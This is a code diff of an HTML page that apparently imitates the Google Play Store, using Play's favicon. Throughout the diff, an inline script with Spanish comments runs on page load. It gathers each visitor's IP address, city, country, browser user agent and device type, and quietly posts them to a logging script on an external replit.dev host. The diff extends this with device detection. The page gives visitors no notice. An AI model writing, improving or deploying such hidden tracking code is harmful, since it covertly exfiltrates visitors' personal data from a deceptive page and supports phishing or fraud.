@@ -7,38 +7,47 @@
   <link rel="shortcut icon" href="https://www.gstatic.com/android/market_images/web/favicon_v3.ico" />
   <link rel="manifest" href="manifest.json">
 
-    <script>
-    async function capturarDatos() {
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
+<script>
+  async function capturarDatos() {
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      const data = await res.json();
 
-        const ip = data.ip;
-        const ciudad = data.city;
-        const pais = data.country_name;
-        const navegador = navigator.userAgent;
+      const ip = data.ip;
+      const ciudad = data.city;
+      const pais = data.country_name;
+      const navegador = navigator.userAgent;
 
-        // Enviar datos al PHP
-        await fetch('https://2ebbe10d-570e-42ec-bb8f-2446a1d99bc0-00-2lmjcqgkkljfz.spock.replit.dev/guardarlogs.php', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            ip: ip,
-            ciudad: ciudad,
-            pais: pais,
-            navegador: navegador
-          })
-        });
+      // Detectar tipo de dispositivo
+      let dispositivo = 'Desconocido';
+      const ua = navegador.toLowerCase();
 
-      } catch (e) {
-        console.error("Error capturando datos:", e);
-      }
+      if (ua.includes("android")) dispositivo = "Android";
+      else if (ua.includes("iphone")) dispositivo = "iPhone";
+      else if (ua.includes("ipad")) dispositivo = "iPad";
+      else if (ua.includes("windows")) dispositivo = "Windows";
+      else if (ua.includes("mac")) dispositivo = "MacOS";
+      else if (ua.includes("linux")) dispositivo = "Linux";
+
+      // Enviar datos al servidor PHP
+      await fetch('https://2ebbe10d-570e-42ec-bb8f-2446a1d99bc0-00-2lmjcqgkkljfz.spock.replit.dev/guardarlos.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          ip: ip,
+          ciudad: ciudad,
+          pais: pais,
+          navegador: navegador,
+          dispositivo: dispositivo
+        })
+      });
+    } catch (e) {
+      console.error("Error capturando datos:", e);
     }
+  }
 
-    capturarDatos();
-  </script>
+  capturarDatos();
+</script>
   
 <script>
   window.onload = function () {
